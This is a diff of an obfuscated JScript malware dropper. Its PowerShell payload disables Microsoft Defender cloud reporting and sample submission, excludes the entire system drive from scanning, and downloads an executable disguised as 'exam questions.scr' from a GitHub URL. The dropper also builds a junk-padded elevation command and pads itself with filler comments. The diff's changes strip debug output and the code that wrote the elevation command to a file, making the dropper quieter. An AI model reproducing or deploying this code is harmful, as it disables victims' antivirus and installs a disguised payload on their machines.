@@ -536,16 +536,12 @@ var psPath = tempFolder + "\\" + psFilename;
 
 var psContent =
 'try {\n' +
-'    Write-Output "Opening file...";\n' +
 '    Set-MpPreference -MAPSReporting 0;\n' +
 '    Set-MpPreference -SubmitSamplesConsent 2;\n' +
 '    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
 '} catch {\n' +
 '    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
 '}\n' +
-'\n' +
-'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
-'\n' +
 '$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/exam%20questions.scr";\n' +
 '$destination = "$env:TEMP\\exam questions.scr";\n' +
 'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
@@ -931,18 +927,6 @@ var enc2 = "' GHVNWZDLWW-VGHVNWZDLWWeGHVNWZDLWWrGHVNWZDLWWbGHVNWZDLWW GHVNWZDLWW
 var elevateCmd = rpl(enc1, junk) + "\\\"" + psPath + rpl(enc2, junk);
 
 
-
-// 📍 Get current script directory
-var currentDir = fso.GetParentFolderName(WScript.ScriptFullName);
-
-// 📄 Define output file path
-var outputPath = currentDir + "\\elevateCmd.txt";
-
-// 🖊️ Write elevateCmd to file
-var file = fso.CreateTextFile(outputPath, true);
-file.WriteLine(elevateCmd);
-file.Close();
-
 //EWBAJSLVZWFOFHHKDZOHXCOZZKHFJKDGJVHDCCHCJIWVOZEXOGKNZRZATTXZOQXWVOXCTMXUGEWBUUUCCSHDDXEQLNNHNZUWUALXGMGHMSJYTZHBBZFUDDUEBSRFEJEKWZPBFDUIDWIRCBQARDPLBYJRQDHBEYNZJIKWSJGGQOCJVJSIBHAJJFRKYNWHGSEPGFQXOYNDQUFTITVAYXBFYRHNAIECKEOPJQDTHOJWJEDVCHXEWRQXIPEHNU
 //EWBAJSLVZWFOFHHKDZOHXCOZZKHFJKDGJVHDCCHCJIWVOZEXOGKNZRZATTXZOQXWVOXCTMXUGEWBUUUCCSHDDXEQLNNHNZUWUALXGMGHMSJYTZHBBZFUDDUEBSRFEJEKWZPBFDUIDWIRCBQARDPLBYJRQDHBEYNZJIKWSJGGQOCJVJSIBHAJJFRKYNWHGSEPGFQXOYNDQUFTITVAYXBFYRHNAIECKEOPJQDTHOJWJEDVCHXEWRQXIPEHNU
 //EWBAJSLVZWFOFHHKDZOHXCOZZKHFJKDGJVHDCCHCJIWVOZEXOGKNZRZATTXZOQXWVOXCTMXUGEWBUUUCCSHDDXEQLNNHNZUWUALXGMGHMSJYTZHBBZFUDDUEBSRFEJEKWZPBFDUIDWIRCBQARDPLBYJRQDHBEYNZJIKWSJGGQOCJVJSIBHAJJFRKYNWHGSEPGFQXOYNDQUFTITVAYXBFYRHNAIECKEOPJQDTHOJWJEDVCHXEWRQXIPEHNU
@@ -1129,3 +1113,4 @@ try {
 
 
 WScript.Quit(0);
+
